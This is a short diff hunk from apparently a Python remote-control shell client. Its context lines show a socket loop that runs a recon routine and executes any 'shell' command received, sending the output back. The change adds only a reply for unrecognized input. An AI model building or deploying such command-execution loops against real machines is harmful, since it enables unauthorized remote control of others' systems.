@@ -53,6 +53,8 @@ def ctrl_shell_client(host, port):
             socksend(s, ctrl_shell_recon())
         elif inp.startswith('shell '):
             socksend(s, cmd_exec(inp[6:]).strip())
+        else:
+            socksend(s, 'Unrecognized')
     s.close()
 
 
